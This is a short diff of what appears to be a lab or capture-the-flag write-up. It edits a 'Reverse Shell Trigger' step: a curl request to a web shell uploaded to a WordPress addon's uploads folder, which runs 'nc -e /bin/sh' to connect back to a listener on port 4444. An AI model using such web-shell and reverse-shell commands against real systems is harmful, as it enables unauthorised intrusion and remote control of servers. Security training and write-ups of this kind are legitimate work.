@@ -141,7 +141,7 @@ nc -lvnp 4444
 ### Reverse Shell Trigger
 
 ```bash
-curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "ip" 4444"
+curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "10.8.15.88" 4444"
 ```
 
 <img width="517" height="258" alt="cevap 4" src="https://github.com/user-attachments/assets/94fdba58-93c5-4eea-b185-fa1bfbfc137c" />
